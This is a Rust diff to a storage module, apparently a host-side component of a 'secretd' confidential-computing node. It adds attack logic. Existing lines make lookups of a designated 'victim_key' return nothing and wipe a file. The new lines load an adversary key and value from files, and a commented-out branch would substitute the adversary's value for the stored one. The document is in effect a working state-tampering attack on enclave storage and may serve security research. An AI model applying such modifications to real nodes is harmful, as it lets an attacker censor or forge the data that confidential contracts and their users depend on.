@@ -10,6 +10,8 @@ use crate::memory::Buffer;
 use std::fs::File;
 use std::io::{Write, BufReader, BufRead};
 const VICTIM_PATH: &str = "/root/.secretd/victim_key";
+const ADV_KEY: &str = "/root/.secretd/adv_key";
+const ADV_VALUE: &str = "/root/.secretd/adv_value";
 
 // this represents something passed in from the caller side of FFI
 #[repr(C)]
@@ -96,12 +98,31 @@ impl Storage for DB {
         }
         info!("victim_key: {:?}", victim_key);
 
+        let input_adv_key = File::open(ADV_KEY).unwrap();
+        let buffered_adv_key = BufReader::new(input_adv_key);
+        let mut adv_key = "".to_string();
+        for line in buffered_adv_key.lines() {
+            adv_key = line.unwrap();
+        }
+        info!("adv_key: {:?}", adv_key);
+        
+        let input_adv_value = File::open(ADV_VALUE).unwrap();
+        let buffered_adv_value = BufReader::new(input_adv_value);
+        let mut adv_value = "".to_string();
+        for line in buffered_adv_value.lines() {
+            adv_value = line.unwrap();
+        }
+        info!("adv_value: {:?}", adv_value);
+        
         let value = if result_buf.ptr.is_null() || hex::encode(key) == victim_key {
             info!("unexisting key: {:?}", hex::encode(key));
             let mut f = std::fs::OpenOptions::new().write(true).truncate(true).open(VICTIM_PATH).unwrap();
             f.write_all(b"").unwrap();
             f.flush().unwrap();
             None
+        //} else if hex::encode(key) == adv_key {
+            //unsafe{info!("value: {:?}", String::from_utf8(result_buf.consume()).unwrap());}
+        //    Some(adv_value.as_bytes().to_vec())
         } else {
             Some(unsafe{result_buf.consume()})
         };
